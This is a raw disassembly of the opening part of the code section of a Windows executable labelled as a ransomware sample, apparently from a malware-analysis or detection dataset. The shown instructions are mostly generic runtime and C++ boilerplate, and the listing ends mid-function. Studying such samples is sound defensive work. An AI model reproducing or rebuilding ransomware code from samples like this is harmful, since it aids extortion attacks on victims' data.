
malware_samples/ransomware/806f3e980694e839b9563415b38a44fbf3e4832e67670233495962dcce367423.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d d5 34 04 00 	lea    0x434d5(%rip),%rcx        # 0x1400444e0
   14000100b:	e8 a8 9b 00 00       	call   0x14000abb8
   140001010:	48 8d 0d 19 ec 02 00 	lea    0x2ec19(%rip),%rcx        # 0x14002fc30
   140001017:	48 83 c4 28          	add    $0x28,%rsp
   14000101b:	e9 1c e3 00 00       	jmp    0x14000f33c
   140001020:	48 83 ec 28          	sub    $0x28,%rsp
   140001024:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000102a:	48 8d 15 7f 36 04 00 	lea    0x4367f(%rip),%rdx        # 0x1400446b0
   140001031:	45 33 c0             	xor    %r8d,%r8d
   140001034:	48 8d 0d 05 36 04 00 	lea    0x43605(%rip),%rcx        # 0x140044640
   14000103b:	e8 dc a1 00 00       	call   0x14000b21c
   140001040:	48 8d 0d f5 eb 02 00 	lea    0x2ebf5(%rip),%rcx        # 0x14002fc3c
   140001047:	48 83 c4 28          	add    $0x28,%rsp
   14000104b:	e9 ec e2 00 00       	jmp    0x14000f33c
   140001050:	40 53                	rex push %rbx
   140001052:	48 83 ec 20          	sub    $0x20,%rsp
   140001056:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000105b:	e8 a4 64 01 00       	call   0x140017504
   140001060:	48 8d 0d 49 36 04 00 	lea    0x43649(%rip),%rcx        # 0x1400446b0
   140001067:	48 8b d8             	mov    %rax,%rbx
   14000106a:	e8 4d a2 00 00       	call   0x14000b2bc
   14000106f:	48 8d 05 e2 f6 02 00 	lea    0x2f6e2(%rip),%rax        # 0x140030758
   140001076:	45 33 c0             	xor    %r8d,%r8d
   140001079:	48 8b d3             	mov    %rbx,%rdx
   14000107c:	48 89 05 2d 36 04 00 	mov    %rax,0x4362d(%rip)        # 0x1400446b0
   140001083:	48 8d 0d 26 36 04 00 	lea    0x43626(%rip),%rcx        # 0x1400446b0
   14000108a:	e8 01 a8 00 00       	call   0x14000b890
   14000108f:	48 8d 0d fa eb 02 00 	lea    0x2ebfa(%rip),%rcx        # 0x14002fc90
   140001096:	48 83 c4 20          	add    $0x20,%rsp
   14000109a:	5b                   	pop    %rbx
   14000109b:	e9 9c e2 00 00       	jmp    0x14000f33c
   1400010a0:	48 8b 15 09 3b 04 00 	mov    0x43b09(%rip),%rdx        # 0x140044bb0
   1400010a7:	4c 8d 05 92 35 04 00 	lea    0x43592(%rip),%r8        # 0x140044640
   1400010ae:	4c 89 05 03 3b 04 00 	mov    %r8,0x43b03(%rip)        # 0x140044bb8
   1400010b5:	48 85 d2             	test   %rdx,%rdx
   1400010b8:	74 13                	je     0x1400010cd
   1400010ba:	48 8b 02             	mov    (%rdx),%rax
   1400010bd:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400010c1:	4c 89 44 11 50       	mov    %r8,0x50(%rcx,%rdx,1)
   1400010c6:	4c 8b 05 eb 3a 04 00 	mov    0x43aeb(%rip),%r8        # 0x140044bb8
   1400010cd:	48 8b 15 ec 3a 04 00 	mov    0x43aec(%rip),%rdx        # 0x140044bc0
   1400010d4:	48 85 d2             	test   %rdx,%rdx
   1400010d7:	74 0c                	je     0x1400010e5
   1400010d9:	48 8b 02             	mov    (%rdx),%rax
   1400010dc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400010e0:	4c 89 44 11 50       	mov    %r8,0x50(%rcx,%rdx,1)
   1400010e5:	c3                   	ret
   1400010e6:	cc                   	int3
   1400010e7:	cc                   	int3
   1400010e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400010ec:	48 8d 0d 3d 35 04 00 	lea    0x4353d(%rip),%rcx        # 0x140044630
   1400010f3:	e8 c0 9a 00 00       	call   0x14000abb8
   1400010f8:	48 8d 0d 9d eb 02 00 	lea    0x2eb9d(%rip),%rcx        # 0x14002fc9c
   1400010ff:	48 83 c4 28          	add    $0x28,%rsp
   140001103:	e9 34 e2 00 00       	jmp    0x14000f33c
   140001108:	48 8d 0d f5 eb 02 00 	lea    0x2ebf5(%rip),%rcx        # 0x14002fd04
   14000110f:	e9 28 e2 00 00       	jmp    0x14000f33c
   140001114:	48 8d 0d 8d eb 02 00 	lea    0x2eb8d(%rip),%rcx        # 0x14002fca8
   14000111b:	e9 1c e2 00 00       	jmp    0x14000f33c
   140001120:	48 8b 15 a9 3a 04 00 	mov    0x43aa9(%rip),%rdx        # 0x140044bd0
   140001127:	4c 8d 05 b2 36 04 00 	lea    0x436b2(%rip),%r8        # 0x1400447e0
   14000112e:	4c 89 05 a3 3a 04 00 	mov    %r8,0x43aa3(%rip)        # 0x140044bd8
   140001135:	48 85 d2             	test   %rdx,%rdx
   140001138:	74 13                	je     0x14000114d
   14000113a:	48 8b 02             	mov    (%rdx),%rax
   14000113d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001141:	4c 89 44 11 50       	mov    %r8,0x50(%rcx,%rdx,1)
   140001146:	4c 8b 05 8b 3a 04 00 	mov    0x43a8b(%rip),%r8        # 0x140044bd8
   14000114d:	48 8b 15 8c 3a 04 00 	mov    0x43a8c(%rip),%rdx        # 0x140044be0
   140001154:	48 85 d2             	test   %rdx,%rdx
   140001157:	74 0c                	je     0x140001165
   140001159:	48 8b 02             	mov    (%rdx),%rax
   14000115c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001160:	4c 89 44 11 50       	mov    %r8,0x50(%rcx,%rdx,1)
   140001165:	c3                   	ret
   140001166:	cc                   	int3
   140001167:	cc                   	int3
   140001168:	48 83 ec 28          	sub    $0x28,%rsp
   14000116c:	48 8d 0d 5d 36 04 00 	lea    0x4365d(%rip),%rcx        # 0x1400447d0
   140001173:	e8 40 9a 00 00       	call   0x14000abb8
   140001178:	48 8d 0d c5 eb 02 00 	lea    0x2ebc5(%rip),%rcx        # 0x14002fd44
   14000117f:	48 83 c4 28          	add    $0x28,%rsp
   140001183:	e9 b4 e1 00 00       	jmp    0x14000f33c
   140001188:	48 83 ec 28          	sub    $0x28,%rsp
   14000118c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001192:	48 8d 15 b7 36 04 00 	lea    0x436b7(%rip),%rdx        # 0x140044850
   140001199:	45 33 c0             	xor    %r8d,%r8d
   14000119c:	48 8d 0d 3d 36 04 00 	lea    0x4363d(%rip),%rcx        # 0x1400447e0
   1400011a3:	e8 dc bc 00 00       	call   0x14000ce84
   1400011a8:	48 8d 0d a1 eb 02 00 	lea    0x2eba1(%rip),%rcx        # 0x14002fd50
   1400011af:	48 83 c4 28          	add    $0x28,%rsp
   1400011b3:	e9 84 e1 00 00       	jmp    0x14000f33c
   1400011b8:	48 83 ec 28          	sub    $0x28,%rsp
   1400011bc:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400011c1:	e8 3e 63 01 00       	call   0x140017504
   1400011c6:	48 8b d0             	mov    %rax,%rdx
   1400011c9:	48 8d 0d 80 36 04 00 	lea    0x43680(%rip),%rcx        # 0x140044850
   1400011d0:	e8 1f bc 00 00       	call   0x14000cdf4
   1400011d5:	48 8d 0d c8 eb 02 00 	lea    0x2ebc8(%rip),%rcx        # 0x14002fda4
   1400011dc:	48 83 c4 28          	add    $0x28,%rsp
   1400011e0:	e9 57 e1 00 00       	jmp    0x14000f33c
   1400011e5:	cc                   	int3
   1400011e6:	cc                   	int3
   1400011e7:	cc                   	int3
   1400011e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400011ec:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400011f2:	48 8d 15 87 37 04 00 	lea    0x43787(%rip),%rdx        # 0x140044980
   1400011f9:	45 33 c0             	xor    %r8d,%r8d
   1400011fc:	48 8d 0d 0d 37 04 00 	lea    0x4370d(%rip),%rcx        # 0x140044910
   140001203:	e8 14 a0 00 00       	call   0x14000b21c
   140001208:	48 8d 0d a1 eb 02 00 	lea    0x2eba1(%rip),%rcx        # 0x14002fdb0
   14000120f:	48 83 c4 28          	add    $0x28,%rsp
   140001213:	e9 24 e1 00 00       	jmp    0x14000f33c
   140001218:	40 53                	rex push %rbx
   14000121a:	48 83 ec 20          	sub    $0x20,%rsp
   14000121e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001223:	e8 dc 62 01 00       	call   0x140017504
   140001228:	48 8d 0d 51 37 04 00 	lea    0x43751(%rip),%rcx        # 0x140044980
   14000122f:	48 8b d8             	mov    %rax,%rbx
   140001232:	e8 85 a0 00 00       	call   0x14000b2bc
   140001237:	48 8d 05 1a f5 02 00 	lea    0x2f51a(%rip),%rax        # 0x140030758
   14000123e:	45 33 c0             	xor    %r8d,%r8d
   140001241:	48 8b d3             	mov    %rbx,%rdx
   140001244:	48 89 05 35 37 04 00 	mov    %rax,0x43735(%rip)        # 0x140044980
   14000124b:	48 8d 0d 2e 37 04 00 	lea    0x4372e(%rip),%rcx        # 0x140044980
   140001252:	e8 39 a6 00 00       	call   0x14000b890
   140001257:	48 8d 0d a6 eb 02 00 	lea    0x2eba6(%rip),%rcx        # 0x14002fe04
   14000125e:	48 83 c4 20          	add    $0x20,%rsp
   140001262:	5b                   	pop    %rbx
   140001263:	e9 d4 e0 00 00       	jmp    0x14000f33c
   140001268:	48 8b 05 a1 36 04 00 	mov    0x436a1(%rip),%rax        # 0x140044910
   14000126f:	48 8d 15 9a 36 04 00 	lea    0x4369a(%rip),%rdx        # 0x140044910
   140001276:	48 89 15 43 39 04 00 	mov    %rdx,0x43943(%rip)        # 0x140044bc0
   14000127d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001281:	48 8b 05 30 39 04 00 	mov    0x43930(%rip),%rax        # 0x140044bb8
   140001288:	48 89 44 11 50       	mov    %rax,0x50(%rcx,%rdx,1)
   14000128d:	48 8b 05 7c 36 04 00 	mov    0x4367c(%rip),%rax        # 0x140044910
   140001294:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001298:	83 4c 11 18 02       	orl    $0x2,0x18(%rcx,%rdx,1)
   14000129d:	c3                   	ret
   14000129e:	cc                   	int3
   14000129f:	cc                   	int3
   1400012a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400012a4:	48 8d 0d 55 36 04 00 	lea    0x43655(%rip),%rcx        # 0x140044900
   1400012ab:	e8 08 99 00 00       	call   0x14000abb8
   1400012b0:	48 8d 0d 59 eb 02 00 	lea    0x2eb59(%rip),%rcx        # 0x14002fe10
   1400012b7:	48 83 c4 28          	add    $0x28,%rsp
   1400012bb:	e9 7c e0 00 00       	jmp    0x14000f33c
   1400012c0:	48 8b 05 69 37 04 00 	mov    0x43769(%rip),%rax        # 0x140044a30
   1400012c7:	48 8d 15 62 37 04 00 	lea    0x43762(%rip),%rdx        # 0x140044a30
   1400012ce:	48 89 15 0b 39 04 00 	mov    %rdx,0x4390b(%rip)        # 0x140044be0
   1400012d5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400012d9:	48 8b 05 f8 38 04 00 	mov    0x438f8(%rip),%rax        # 0x140044bd8
   1400012e0:	48 89 44 11 50       	mov    %rax,0x50(%rcx,%rdx,1)
   1400012e5:	48 8b 05 44 37 04 00 	mov    0x43744(%rip),%rax        # 0x140044a30
   1400012ec:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400012f0:	83 4c 11 18 02       	orl    $0x2,0x18(%rcx,%rdx,1)
   1400012f5:	c3                   	ret
   1400012f6:	cc                   	int3
   1400012f7:	cc                   	int3
   1400012f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400012fc:	48 8d 0d 1d 37 04 00 	lea    0x4371d(%rip),%rcx        # 0x140044a20
   140001303:	e8 b0 98 00 00       	call   0x14000abb8
   140001308:	48 8d 0d 0d eb 02 00 	lea    0x2eb0d(%rip),%rcx        # 0x14002fe1c
   14000130f:	48 83 c4 28          	add    $0x28,%rsp
   140001313:	e9 24 e0 00 00       	jmp    0x14000f33c
   140001318:	48 83 ec 28          	sub    $0x28,%rsp
   14000131c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001322:	48 8d 15 77 37 04 00 	lea    0x43777(%rip),%rdx        # 0x140044aa0
   140001329:	45 33 c0             	xor    %r8d,%r8d
   14000132c:	48 8d 0d fd 36 04 00 	lea    0x436fd(%rip),%rcx        # 0x140044a30
   140001333:	e8 4c bb 00 00       	call   0x14000ce84
   140001338:	48 8d 0d e9 ea 02 00 	lea    0x2eae9(%rip),%rcx        # 0x14002fe28
   14000133f:	48 83 c4 28          	add    $0x28,%rsp
   140001343:	e9 f4 df 00 00       	jmp    0x14000f33c
   140001348:	48 83 ec 28          	sub    $0x28,%rsp
   14000134c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001351:	e8 ae 61 01 00       	call   0x140017504
   140001356:	48 8b d0             	mov    %rax,%rdx
   140001359:	48 8d 0d 40 37 04 00 	lea    0x43740(%rip),%rcx        # 0x140044aa0
   140001360:	e8 8f ba 00 00       	call   0x14000cdf4
   140001365:	48 8d 0d 10 eb 02 00 	lea    0x2eb10(%rip),%rcx        # 0x14002fe7c
   14000136c:	48 83 c4 28          	add    $0x28,%rsp
   140001370:	e9 c7 df 00 00       	jmp    0x14000f33c
   140001375:	cc                   	int3
   140001376:	cc                   	int3
   140001377:	cc                   	int3
   140001378:	48 83 ec 28          	sub    $0x28,%rsp
   14000137c:	48 8d 0d 6d 38 04 00 	lea    0x4386d(%rip),%rcx        # 0x140044bf0
   140001383:	e8 30 98 00 00       	call   0x14000abb8
   140001388:	48 8d 0d 39 eb 02 00 	lea    0x2eb39(%rip),%rcx        # 0x14002fec8
   14000138f:	48 83 c4 28          	add    $0x28,%rsp
   140001393:	e9 a4 df 00 00       	jmp    0x14000f33c
   140001398:	48 8d 0d e9 ea 02 00 	lea    0x2eae9(%rip),%rcx        # 0x14002fe88
   14000139f:	e9 98 df 00 00       	jmp    0x14000f33c
   1400013a4:	cc                   	int3
   1400013a5:	cc                   	int3
   1400013a6:	cc                   	int3
   1400013a7:	cc                   	int3
   1400013a8:	cc                   	int3
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	48 8d 05 81 4d 04 00 	lea    0x44d81(%rip),%rax        # 0x140046138
   1400013b7:	c3                   	ret
   1400013b8:	cc                   	int3
   1400013b9:	cc                   	int3
   1400013ba:	cc                   	int3
   1400013bb:	cc                   	int3
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400013c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400013ca:	53                   	push   %rbx
   1400013cb:	55                   	push   %rbp
   1400013cc:	56                   	push   %rsi
   1400013cd:	57                   	push   %rdi
   1400013ce:	48 83 ec 38          	sub    $0x38,%rsp
   1400013d2:	49 8b f0             	mov    %r8,%rsi
   1400013d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400013da:	48 8b fa             	mov    %rdx,%rdi
   1400013dd:	48 8b d9             	mov    %rcx,%rbx
   1400013e0:	e8 cb ff ff ff       	call   0x1400013b0
   1400013e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400013ea:	4c 8b ce             	mov    %rsi,%r9
   1400013ed:	4c 8b c7             	mov    %rdi,%r8
   1400013f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400013f7:	00 00 
   1400013f9:	48 8b d3             	mov    %rbx,%rdx
   1400013fc:	48 8b 08             	mov    (%rax),%rcx
   1400013ff:	e8 98 57 01 00       	call   0x140016b9c
   140001404:	85 c0                	test   %eax,%eax
   140001406:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000140b:	0f 48 c1             	cmovs  %ecx,%eax
   14000140e:	48 83 c4 38          	add    $0x38,%rsp
   140001412:	5f                   	pop    %rdi
   140001413:	5e                   	pop    %rsi
   140001414:	5d                   	pop    %rbp
   140001415:	5b                   	pop    %rbx
   140001416:	c3                   	ret
   140001417:	cc                   	int3
   140001418:	cc                   	int3
   140001419:	cc                   	int3
   14000141a:	cc                   	int3
   14000141b:	cc                   	int3
   14000141c:	cc                   	int3
   14000141d:	cc                   	int3
   14000141e:	cc                   	int3
   14000141f:	cc                   	int3
   140001420:	40 53                	rex push %rbx
   140001422:	48 83 ec 20          	sub    $0x20,%rsp
   140001426:	48 8b d9             	mov    %rcx,%rbx
   140001429:	48 8b c2             	mov    %rdx,%rax
   14000142c:	48 8d 0d 55 f0 02 00 	lea    0x2f055(%rip),%rcx        # 0x140030488
   140001433:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001436:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000143a:	48 89 0b             	mov    %rcx,(%rbx)
   14000143d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001441:	0f 11 02             	movups %xmm0,(%rdx)
   140001444:	e8 33 f6 00 00       	call   0x140010a7c
   140001449:	48 8b c3             	mov    %rbx,%rax
   14000144c:	48 83 c4 20          	add    $0x20,%rsp
   140001450:	5b                   	pop    %rbx
   140001451:	c3                   	ret
   140001452:	cc                   	int3
   140001453:	cc                   	int3
   140001454:	cc                   	int3
   140001455:	cc                   	int3
   140001456:	cc                   	int3
   140001457:	cc                   	int3
   140001458:	cc                   	int3
   140001459:	cc                   	int3
   14000145a:	cc                   	int3
   14000145b:	cc                   	int3
   14000145c:	cc                   	int3
   14000145d:	cc                   	int3
   14000145e:	cc                   	int3
   14000145f:	cc                   	int3
   140001460:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001464:	48 8d 05 9d 9f 03 00 	lea    0x39f9d(%rip),%rax        # 0x14003b408
   14000146b:	48 85 d2             	test   %rdx,%rdx
   14000146e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001472:	c3                   	ret
   140001473:	cc                   	int3
   140001474:	cc                   	int3
   140001475:	cc                   	int3
   140001476:	cc                   	int3
   140001477:	cc                   	int3
   140001478:	cc                   	int3
   140001479:	cc                   	int3
   14000147a:	cc                   	int3
   14000147b:	cc                   	int3
   14000147c:	cc                   	int3
   14000147d:	cc                   	int3
   14000147e:	cc                   	int3
   14000147f:	cc                   	int3
   140001480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001485:	57                   	push   %rdi
   140001486:	48 83 ec 20          	sub    $0x20,%rsp
   14000148a:	48 8d 05 f7 ef 02 00 	lea    0x2eff7(%rip),%rax        # 0x140030488
   140001491:	48 8b f9             	mov    %rcx,%rdi
   140001494:	48 89 01             	mov    %rax,(%rcx)
   140001497:	8b da                	mov    %edx,%ebx
   140001499:	48 83 c1 08          	add    $0x8,%rcx
   14000149d:	e8 6a f6 00 00       	call   0x140010b0c
   1400014a2:	f6 c3 01             	test   $0x1,%bl
   1400014a5:	74 0d                	je     0x1400014b4
   1400014a7:	ba 18 00 00 00       	mov    $0x18,%edx
   1400014ac:	48 8b cf             	mov    %rdi,%rcx
   1400014af:	e8 6c d9 00 00       	call   0x14000ee20
   1400014b4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400014b9:	48 8b c7             	mov    %rdi,%rax
   1400014bc:	48 83 c4 20          	add    $0x20,%rsp
   1400014c0:	5f                   	pop    %rdi
   1400014c1:	c3                   	ret
   1400014c2:	cc                   	int3
   1400014c3:	cc                   	int3
   1400014c4:	cc                   	int3
   1400014c5:	cc                   	int3
   1400014c6:	cc                   	int3
   1400014c7:	cc                   	int3
   1400014c8:	cc                   	int3
   1400014c9:	cc                   	int3
   1400014ca:	cc                   	int3
   1400014cb:	cc                   	int3
   1400014cc:	cc                   	int3
   1400014cd:	cc                   	int3
   1400014ce:	cc                   	int3
   1400014cf:	cc                   	int3
   1400014d0:	48 8d 05 b1 ef 02 00 	lea    0x2efb1(%rip),%rax        # 0x140030488
   1400014d7:	48 89 01             	mov    %rax,(%rcx)
   1400014da:	48 83 c1 08          	add    $0x8,%rcx
   1400014de:	e9 29 f6 00 00       	jmp    0x140010b0c
   1400014e3:	cc                   	int3
   1400014e4:	cc                   	int3
   1400014e5:	cc                   	int3
   1400014e6:	cc                   	int3
   1400014e7:	cc                   	int3
   1400014e8:	cc                   	int3
   1400014e9:	cc                   	int3
   1400014ea:	cc                   	int3
   1400014eb:	cc                   	int3
   1400014ec:	cc                   	int3
   1400014ed:	cc                   	int3
   1400014ee:	cc                   	int3
   1400014ef:	cc                   	int3
   1400014f0:	48 8d 05 29 9f 03 00 	lea    0x39f29(%rip),%rax        # 0x14003b420
   1400014f7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400014fe:	00 
   1400014ff:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001503:	48 8d 05 66 f0 02 00 	lea    0x2f066(%rip),%rax        # 0x140030570
   14000150a:	48 89 01             	mov    %rax,(%rcx)
   14000150d:	48 8b c1             	mov    %rcx,%rax
   140001510:	c3                   	ret
   140001511:	cc                   	int3
   140001512:	cc                   	int3
   140001513:	cc                   	int3
   140001514:	cc                   	int3
   140001515:	cc                   	int3
   140001516:	cc                   	int3
   140001517:	cc                   	int3
   140001518:	cc                   	int3
   140001519:	cc                   	int3
   14000151a:	cc                   	int3
   14000151b:	cc                   	int3
   14000151c:	cc                   	int3
   14000151d:	cc                   	int3
   14000151e:	cc                   	int3
   14000151f:	cc                   	int3
   140001520:	48 83 ec 48          	sub    $0x48,%rsp
   140001524:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001529:	e8 c2 ff ff ff       	call   0x1400014f0
   14000152e:	48 8d 15 cb 03 04 00 	lea    0x403cb(%rip),%rdx        # 0x140041900
   140001535:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000153a:	e8 81 f7 00 00       	call   0x140010cc0
   14000153f:	cc                   	int3
   140001540:	40 53                	rex push %rbx
   140001542:	48 83 ec 20          	sub    $0x20,%rsp
   140001546:	48 8b d9             	mov    %rcx,%rbx
   140001549:	48 8b c2             	mov    %rdx,%rax
   14000154c:	48 8d 0d 35 ef 02 00 	lea    0x2ef35(%rip),%rcx        # 0x140030488
   140001553:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001556:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000155a:	48 89 0b             	mov    %rcx,(%rbx)
   14000155d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001561:	0f 11 02             	movups %xmm0,(%rdx)
   140001564:	e8 13 f5 00 00       	call   0x140010a7c
   140001569:	48 8d 05 00 f0 02 00 	lea    0x2f000(%rip),%rax        # 0x140030570
   140001570:	48 89 03             	mov    %rax,(%rbx)
   140001573:	48 8b c3             	mov    %rbx,%rax
   140001576:	48 83 c4 20          	add    $0x20,%rsp
   14000157a:	5b                   	pop    %rbx
   14000157b:	c3                   	ret
   14000157c:	cc                   	int3
   14000157d:	cc                   	int3
   14000157e:	cc                   	int3
   14000157f:	cc                   	int3
   140001580:	40 53                	rex push %rbx
   140001582:	48 83 ec 20          	sub    $0x20,%rsp
   140001586:	48 8b d9             	mov    %rcx,%rbx
   140001589:	48 8b c2             	mov    %rdx,%rax
   14000158c:	48 8d 0d f5 ee 02 00 	lea    0x2eef5(%rip),%rcx        # 0x140030488
   140001593:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001596:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000159a:	48 89 0b             	mov    %rcx,(%rbx)
   14000159d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400015a1:	0f 11 02             	movups %xmm0,(%rdx)
   1400015a4:	e8 d3 f4 00 00       	call   0x140010a7c
   1400015a9:	48 8d 05 f0 ee 02 00 	lea    0x2eef0(%rip),%rax        # 0x1400304a0
   1400015b0:	48 89 03             	mov    %rax,(%rbx)
   1400015b3:	48 8b c3             	mov    %rbx,%rax
   1400015b6:	48 83 c4 20          	add    $0x20,%rsp
   1400015ba:	5b                   	pop    %rbx
   1400015bb:	c3                   	ret
   1400015bc:	cc                   	int3
   1400015bd:	cc                   	int3
   1400015be:	cc                   	int3
   1400015bf:	cc                   	int3
   1400015c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015c4:	48 8d 0d 6d 9e 03 00 	lea    0x39e6d(%rip),%rcx        # 0x14003b438
   1400015cb:	e8 dc 98 00 00       	call   0x14000aeac
   1400015d0:	cc                   	int3
   1400015d1:	cc                   	int3
   1400015d2:	cc                   	int3
   1400015d3:	cc                   	int3
   1400015d4:	cc                   	int3
   1400015d5:	cc                   	int3
   1400015d6:	cc                   	int3
   1400015d7:	cc                   	int3
   1400015d8:	cc                   	int3
   1400015d9:	cc                   	int3
   1400015da:	cc                   	int3
   1400015db:	cc                   	int3
   1400015dc:	cc                   	int3
   1400015dd:	cc                   	int3
   1400015de:	cc                   	int3
   1400015df:	cc                   	int3
   1400015e0:	40 53                	rex push %rbx
   1400015e2:	48 83 ec 40          	sub    $0x40,%rsp
   1400015e6:	48 8b 05 53 1a 04 00 	mov    0x41a53(%rip),%rax        # 0x140043040
   1400015ed:	48 33 c4             	xor    %rsp,%rax
   1400015f0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400015f5:	4c 8b c2             	mov    %rdx,%r8
   1400015f8:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400015fd:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140001601:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140001606:	48 8d 05 7b ee 02 00 	lea    0x2ee7b(%rip),%rax        # 0x140030488
   14000160d:	48 8b d9             	mov    %rcx,%rbx
   140001610:	48 89 01             	mov    %rax,(%rcx)
   140001613:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001616:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000161b:	0f 11 02             	movups %xmm0,(%rdx)
   14000161e:	e8 59 f4 00 00       	call   0x140010a7c
   140001623:	48 8d 05 e6 ee 02 00 	lea    0x2eee6(%rip),%rax        # 0x140030510
   14000162a:	48 89 03             	mov    %rax,(%rbx)
   14000162d:	48 8b c3             	mov    %rbx,%rax
   140001630:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001635:	48 33 cc             	xor    %rsp,%rcx
   140001638:	e8 c3 d7 00 00       	call   0x14000ee00
   14000163d:	48 83 c4 40          	add    $0x40,%rsp
   140001641:	5b                   	pop    %rbx
   140001642:	c3                   	ret
   140001643:	cc                   	int3
   140001644:	cc                   	int3
   140001645:	cc                   	int3
   140001646:	cc                   	int3
   140001647:	cc                   	int3
   140001648:	cc                   	int3
   140001649:	cc                   	int3
   14000164a:	cc                   	int3
   14000164b:	cc                   	int3
   14000164c:	cc                   	int3
   14000164d:	cc                   	int3
   14000164e:	cc                   	int3
   14000164f:	cc                   	int3
   140001650:	40 53                	rex push %rbx
   140001652:	48 83 ec 20          	sub    $0x20,%rsp
   140001656:	48 8b d9             	mov    %rcx,%rbx
   140001659:	48 8b c2             	mov    %rdx,%rax
   14000165c:	48 8d 0d 25 ee 02 00 	lea    0x2ee25(%rip),%rcx        # 0x140030488
   140001663:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001666:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000166a:	48 89 0b             	mov    %rcx,(%rbx)
   14000166d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001671:	0f 11 02             	movups %xmm0,(%rdx)
   140001674:	e8 03 f4 00 00       	call   0x140010a7c
   140001679:	48 8d 05 d8 ee 02 00 	lea    0x2eed8(%rip),%rax        # 0x140030558
   140001680:	48 89 03             	mov    %rax,(%rbx)
   140001683:	48 8b c3             	mov    %rbx,%rax
   140001686:	48 83 c4 20          	add    $0x20,%rsp
   14000168a:	5b                   	pop    %rbx
   14000168b:	c3                   	ret
   14000168c:	cc                   	int3
   14000168d:	cc                   	int3
   14000168e:	cc                   	int3
   14000168f:	cc                   	int3
   140001690:	44 89 02             	mov    %r8d,(%rdx)
   140001693:	48 8b c2             	mov    %rdx,%rax
   140001696:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   14000169a:	c3                   	ret
   14000169b:	cc                   	int3
   14000169c:	cc                   	int3
   14000169d:	cc                   	int3
   14000169e:	cc                   	int3
   14000169f:	cc                   	int3
   1400016a0:	40 53                	rex push %rbx
   1400016a2:	48 83 ec 30          	sub    $0x30,%rsp
   1400016a6:	48 8b 01             	mov    (%rcx),%rax
   1400016a9:	49 8b d8             	mov    %r8,%rbx
   1400016ac:	44 8b c2             	mov    %edx,%r8d
   1400016af:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400016b4:	ff 50 18             	call   *0x18(%rax)
   1400016b7:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400016bb:	4c 8b 48 08          	mov    0x8(%rax),%r9
   1400016bf:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400016c3:	49 39 51 08          	cmp    %rdx,0x8(%r9)
   1400016c7:	75 0e                	jne    0x1400016d7
   1400016c9:	8b 0b                	mov    (%rbx),%ecx
   1400016cb:	39 08                	cmp    %ecx,(%rax)
   1400016cd:	75 08                	jne    0x1400016d7
   1400016cf:	b0 01                	mov    $0x1,%al
   1400016d1:	48 83 c4 30          	add    $0x30,%rsp
   1400016d5:	5b                   	pop    %rbx
   1400016d6:	c3                   	ret
   1400016d7:	32 c0                	xor    %al,%al
   1400016d9:	48 83 c4 30          	add    $0x30,%rsp
   1400016dd:	5b                   	pop    %rbx
